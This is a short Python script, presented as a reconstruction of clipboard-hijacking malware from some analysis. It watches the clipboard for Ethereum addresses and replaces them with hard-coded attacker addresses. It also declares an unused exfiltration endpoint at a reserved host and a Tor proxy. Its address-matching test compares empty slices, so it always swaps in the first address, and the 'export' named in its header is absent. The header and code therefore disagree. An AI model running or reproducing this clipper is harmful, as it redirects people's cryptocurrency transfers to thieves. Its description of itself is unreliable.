# Representative reconstruction of the cited clipboard substitution and export.
# Not recovered malware. Do not execute; all transport destinations are reserved.
import re
import time
import pyperclip
import requests

choices = [
    "0xa97d294c813d68f8a92592dc66a883b0f762ea91",
    "0xb62c41e73d546ba98ac761fed938254a619ce430",
]
endpoint = "https://collector.invalid/route.php"
proxy = {"http": "socks5h://localhost:9050", "https": "socks5h://localhost:9050"}
while True:
    copied = pyperclip.paste()
    if re.fullmatch(r"0x[a-fA-F0-9]{40}", copied):
        for substitute in choices:
            if substitute[1:1] == copied[1:1]:
                pyperclip.copy(substitute)
                break
    time.sleep(0.5)
